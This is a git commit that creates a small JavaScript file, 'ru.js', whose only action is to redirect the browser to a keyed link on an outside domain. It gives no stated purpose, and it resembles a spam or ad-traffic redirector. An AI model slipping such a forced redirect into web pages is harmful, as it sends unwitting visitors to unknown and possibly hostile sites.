c7aed3770728d4c91ae72f03117219bf2da3c1f4
movzen <90816406+movzen@users.noreply.github.com>
2021-09-16 11:56:27 +0800

    Create ru.js

---
+++ ru.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://inquiryclank.com/f2mnb80ep?key=c90b9940c19a9a3b1f8865dc628e8eca'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
